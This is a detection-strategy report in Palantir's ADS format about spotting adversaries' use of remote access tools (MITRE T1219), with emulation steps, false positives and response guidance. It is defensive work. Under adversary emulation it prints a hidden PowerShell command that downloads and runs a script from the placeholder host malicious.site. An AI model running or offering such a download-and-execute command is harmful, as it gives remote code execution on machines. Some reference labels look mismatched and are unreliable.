# Palantir's Alerting & Detection Strategy (ADS) Framework Report

## **Goal**
The aim of this detection technique is to identify adversarial attempts to bypass security monitoring systems using remote access tools (RATs). These RATs can be leveraged by adversaries to gain unauthorized control over a target system, allowing them to execute commands, exfiltrate data, and move laterally within the network.

## **Categorization**
- **MITRE ATT&CK Mapping:** T1219 - Remote Access Software
- **Tactic / Kill Chain Phases:** Command and Control
- **Platforms:** Linux, Windows, macOS
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1219)

## **Strategy Abstract**
The detection strategy leverages a combination of endpoint monitoring data sources such as file integrity monitoring (FIM), process tracking, network traffic analysis, and web request logs. Patterns analyzed include unusual or unauthorized installations of remote access tools, anomalous command execution patterns typically associated with RATs, and irregular network connections indicating C2 activities.

## **Technical Context**
Remote Access Software is commonly used by adversaries to establish a persistent backdoor into compromised systems. Adversaries execute this technique using various methods such as phishing emails containing malicious attachments, exploiting vulnerabilities in remote desktop protocols, or through social engineering tactics that lead to the installation of legitimate remote access software under false pretenses.

### **Adversary Emulation Details**
- Commands: `powershell.exe -nop -w hidden -c "IEX ((New-Object System.Net.WebClient).DownloadString('https://malicious.site/payload.ps1'))"`
- Test Scenarios:
  - Downloading and executing remote access software binaries using PowerShell web requests.
  - Monitoring for unusual processes related to popular RATs such as TeamViewer, AnyDesk, LogMeIn, GoToAssist.

## **Blind Spots and Assumptions**
- Legitimate use of remote access tools by system administrators may be flagged as malicious activity.
- The strategy assumes that all suspicious remote connections are adversarial in nature, potentially missing sophisticated adversaries who mimic legitimate traffic patterns.
- Reliance on known RAT signatures might not detect zero-day or custom-developed remote access tools.

## **False Positives**
- Authorized installation and use of remote access software for IT support or maintenance purposes.
- Employees using personal devices with installed remote desktop applications connecting to home networks.
- Legitimate updates to remote access software that trigger alerts due to new binary signatures.

## **Priority**
**High** - The ability to bypass security monitoring through the use of RATs poses a significant risk, allowing adversaries to maintain persistence and conduct malicious activities undetected. The potential impact on confidentiality, integrity, and availability justifies a high priority for detection efforts.

## **Validation (Adversary Emulation)**
### Step-by-Step Instructions

1. **TeamViewer Files Detected Test on Windows:**
   - Download TeamViewer executable from the official site.
   - Execute and monitor file system changes using FIM tools to detect installation activity.

2. **AnyDesk Files Detected Test on Windows:**
   - Install AnyDesk and initiate a remote session.
   - Track network traffic for unusual connections to AnyDesk servers.

3. **LogMeIn Files Detected Test on Windows:**
   - Install LogMeIn software following the typical user installation path.
   - Observe process creation events for LogMeIn-related processes using endpoint detection tools.

4. **GoToAssist Files Detected Test on Windows:**
   - Download and run GoToAssist installer.
   - Use network monitoring to identify traffic patterns associated with remote support sessions.

5. **ScreenConnect Application Download and Install on Windows:**
   - Manually download the ScreenConnect application from a test server.
   - Monitor installation using endpoint detection solutions to capture related activities.

6. **Ammyy Admin Software Execution:**
   - Execute Ammyy Admin from command line with parameters simulating malicious use.
   - Capture execution patterns and network traffic indicative of remote access tool activity.

7. **RemotePC Software Execution:**
   - Set up RemotePC software in a controlled environment.
   - Track installation, configuration changes, and remote connection events.

8. **NetSupport - RAT Execution:**
   - Deploy NetSupport RAT in an emulated scenario with typical adversarial behavior.
   - Analyze command execution logs and network traffic for anomalies.

9. **UltraViewer - RAT Execution:**
   - Install UltraViewer and initiate a session using unconventional methods.
   - Monitor for unusual process interactions indicative of unauthorized access attempts.

10. **UltraVNC Execution:**
    - Configure UltraVNC server settings to mimic adversarial configurations.
    - Capture login attempts and network communications typical of unauthorized usage.

11. **MSP360 Connect Execution:**
    - Simulate MSP360 installation and setup.
    - Track remote connections and alert on unexpected configuration changes.

12. **RustDesk Files Detected Test on Windows:**
    - Download RustDesk executable and monitor system for installation alerts.
    - Observe network activity to detect unauthorized data transmission.

13. **Splashtop Execution:**
    - Install Splashtop software and simulate remote access activities.
    - Use endpoint protection tools to capture relevant events.

14. **Splashtop Streamer Execution:**
    - Execute the Splashtop Streamer application with atypical parameters.
    - Identify abnormal system behavior using process monitoring tools.

## **Response**
When an alert is triggered, analysts should:
1. Verify if there's legitimate reason for the remote access tool's presence and activity.
2. Conduct a thorough investigation of recent file changes, network connections, and process activities on affected systems.
3. Isolate compromised systems to prevent further unauthorized access or data exfiltration.
4. Update security policies and endpoint protections based on insights gained from the incident.

## **Additional Resources**
- [Usage Of Web Request Commands And Cmdlets](https://attack.mitre.org/techniques/T1218)
- [PowerShell Web Download Techniques](https://www.fireeye.com/blog/threat-research/2015/06/powershell_web_download.html)
- [Suspicious Invoke-WebRequest Execution](https://github.com/fireeye/SkyDive/wiki/Detecting-Suspicious-Invoke-WebRequest)

This framework provides a structured approach to detecting and responding to adversarial use of remote access software, enhancing an organization's ability to thwart potential security breaches.